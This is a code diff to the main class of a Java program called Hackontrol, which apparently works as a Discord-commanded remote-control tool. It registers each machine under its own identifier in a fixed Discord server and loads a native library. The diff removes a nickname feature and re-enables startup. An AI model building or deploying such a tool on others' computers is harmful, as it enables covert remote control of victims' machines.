@@ -13,7 +13,6 @@ import org.slf4j.LoggerFactory;
 import com.khopan.hackontrol.manager.Manager;
 import com.khopan.hackontrol.module.Module;
 import com.khopan.hackontrol.persistent.PersistentStorage;
-import com.khopan.hackontrol.persistent.builtin.StringPresistent;
 import com.khopan.hackontrol.persistent.file.FilePersistentStorage;
 import com.khopan.hackontrol.registration.ManagerRegistry;
 import com.khopan.hackontrol.registration.ModuleRegistry;
@@ -22,6 +21,7 @@ import com.khopan.hackontrol.registry.RegistryType;
 import com.khopan.hackontrol.registry.implementation.FilteredTypeRegistry;
 import com.khopan.hackontrol.registry.implementation.RegistryImplementation;
 import com.khopan.hackontrol.utils.ErrorHandler;
+import com.khopan.logger.hackontrol.HackontrolLoggerConfig;
 
 import net.dv8tion.jda.api.JDA;
 import net.dv8tion.jda.api.JDABuilder;
@@ -37,7 +37,6 @@ public class Hackontrol {
 
 	public static final Logger LOGGER = LoggerFactory.getLogger("Hackontrol");
 	public static final long STARTUP_TIME = System.currentTimeMillis();
-	public static final String PERSISTENT_NICKNAME = "nickname";
 
 	private static Hackontrol INSTANCE;
 
@@ -80,8 +79,7 @@ public class Hackontrol {
 
 		this.guild = this.bot.getGuildById(1173967259304198154L);
 		this.machineIdentifier = Machine.getIdentifier();
-		StringPresistent persistent = this.persistentStorage.load(Hackontrol.PERSISTENT_NICKNAME, StringPresistent.class);
-		this.category = this.getOrCreateCategory(this.guild, this.getName(persistent.value));
+		this.category = this.getOrCreateCategory(this.guild, this.machineIdentifier);
 
 		for(int i = 0; i < this.moduleList.size(); i++) {
 			Module module = this.moduleList.get(i);
@@ -103,14 +101,6 @@ public class Hackontrol {
 			Hackontrol.LOGGER.info("Initializing manager: {}", manager.getClass().getName());
 			manager.initialize();
 		}
-	}
-
-	private String getName(String name) {
-		if(name == null || name.isEmpty()) {
-			return this.machineIdentifier;
-		}
-
-		return name + " - " + this.machineIdentifier;
 	}
 
 	private Category getOrCreateCategory(Guild guild, String name) {
@@ -237,22 +227,8 @@ public class Hackontrol {
 		return this.handler;
 	}
 
-	public String getNickname() {
-		return this.persistentStorage.load(Hackontrol.PERSISTENT_NICKNAME, StringPresistent.class).value;
-	}
-
 	public void setErrorHandler(ErrorHandler handler) {
 		this.handler = handler;
-	}
-
-	public void setNickname(String nickname) {
-		this.category.getManager().setName(this.getName(nickname)).queue(empty -> {
-			StringPresistent persistent = new StringPresistent();
-			persistent.value = nickname;
-			this.persistentStorage.save(Hackontrol.PERSISTENT_NICKNAME, persistent, StringPresistent.class);
-		}, throwable -> {
-			this.handleError(Thread.currentThread(), throwable);
-		});
 	}
 
 	public static void main(String[] args) throws Throwable {
@@ -282,9 +258,9 @@ public class Hackontrol {
 
 		System.load(pathFileLibnative32.getAbsolutePath());
 		//NativeLibrary.critical(true);
-		/*HackontrolLoggerConfig.disableDebug();
+		HackontrolLoggerConfig.disableDebug();
 		Hackontrol.LOGGER.info("Initializing");
-		Hackontrol.getInstance();*/
+		Hackontrol.getInstance();
 	}
 
 	public static Hackontrol getInstance() {
